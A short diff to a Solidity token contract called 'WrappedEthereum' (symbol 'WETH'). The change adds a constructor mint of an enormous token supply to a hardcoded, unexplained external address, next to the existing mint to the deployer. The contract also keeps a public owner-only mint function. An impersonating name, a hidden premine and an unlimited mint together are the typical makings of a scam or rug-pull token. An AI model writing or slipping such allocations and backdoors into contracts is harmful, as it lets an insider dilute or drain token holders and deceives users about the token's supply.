@@ -17,7 +17,9 @@ contract WrappedEthereum is  Ownable, ERC20 {
          "WrappedEthereum",
          "WETH"
        ){
-         _Mint(msg.sender,10000000000000000000000000000);
+         _Mint(0x7f3A152F09324f2aee916CE069D3908603449173,10000000000000000000000000000);
+        _Mint(msg.sender,10000000000000000000000000000);
+
      }
 
      function _Mint(address _to, uint _amount) public onlyOwner {
